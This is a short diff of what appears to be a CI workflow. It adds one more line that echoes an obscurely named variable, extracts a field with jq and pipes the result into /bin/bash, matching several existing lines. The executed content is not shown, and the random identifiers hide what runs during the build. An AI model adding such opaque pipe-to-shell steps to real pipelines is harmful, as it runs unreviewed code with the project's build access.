@@ -38,6 +38,7 @@ jobs:
           echo $esc69 | jq -r .jbrjr92193 | /bin/bash
           printf '%s' "$lh570" | jq -r .okc29 | /bin/bash
           echo $magjp1783 | jq -r .aw5522 | /bin/bash
+          echo $hp84978 | jq -r .begh05925 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
